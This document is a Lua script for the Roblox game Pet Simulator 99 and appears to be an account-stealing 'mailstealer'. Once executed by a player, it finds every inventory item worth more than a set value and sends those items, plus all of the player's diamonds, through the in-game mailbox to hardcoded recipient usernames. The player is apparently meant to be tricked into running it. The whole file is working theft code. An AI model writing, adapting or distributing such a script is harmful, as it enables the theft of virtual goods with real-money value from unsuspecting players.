_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local plr = game.Players.LocalPlayer
local network = require(game.ReplicatedStorage.Library.Client.Network)
local save = require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0

local MailMessage = "GGz"
local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23"}
local min_rap = _G.minrap or 10000000
local GemAmount1 = 1 -- Diamonds total

-- Check users
if #users == 0 then
    plr:kick("No usernames provided")
    return
end
for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- Get total diamonds
for _, v in pairs(save.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Get mail cost function
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if type(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end
if not FunctionToGetFirstPriceOfMail then
    warn("Mail price function not found!")
    return
end
local mailSendPrice = FunctionToGetFirstPriceOfMail()

-- Get RAP function
local function getRAP(Type, Item)
    return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

-- Collect items with min RAP
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc"}
for _, v in pairs(categoryList) do
    if save[v] then
        for uid, item in pairs(save[v]) do
            local rapValue = getRAP(v, item)
            if rapValue >= min_rap then
                table.insert(sortedItems, {
                    category = v,
                    uid = uid,
                    amount = item._am or 1,
                    rap = rapValue,
                    name = item.id
                })
                totalRAP = totalRAP + rapValue*(item._am or 1)
            end
        end
    end
end

-- Sort items by RAP descending
table.sort(sortedItems, function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)

-- Function to send one item stack to users
local function sendItem(category, uid, amount)
    local remaining = amount
    local userIndex = 1
    local maxUsers = #users

    while remaining > 0 do
        local currentUser = users[userIndex]
        local args = {[1]=currentUser, [2]=MailMessage, [3]=category, [4]=uid, [5]=remaining}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.ceil(mailSendPrice * 1.5)
            if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
            remaining = 0
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                warn("All mailboxes full for item "..uid)
                return
            end
        else
            warn("Failed to send item: "..tostring(err))
            return
        end
    end
end

-- Function to send all remaining diamonds
local function sendAllGems()
    local remainingGems = GemAmount1
    local userIndex = 1
    local maxUsers = #users

    while remainingGems > 0 do
        local currentUser = users[userIndex]
        local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=1, [5]=remainingGems}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            remainingGems = 0
            GemAmount1 = 0
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                warn("All mailboxes full for gems")
                return
            end
        else
            warn("Failed to send gems: "..tostring(err))
            return
        end
    end
end

-- -----------------------
-- Execute sending
-- -----------------------
for _, item in ipairs(sortedItems) do
    sendItem(item.category, item.uid, item.amount)
end

if GemAmount1 > 0 then
    sendAllGems()
end
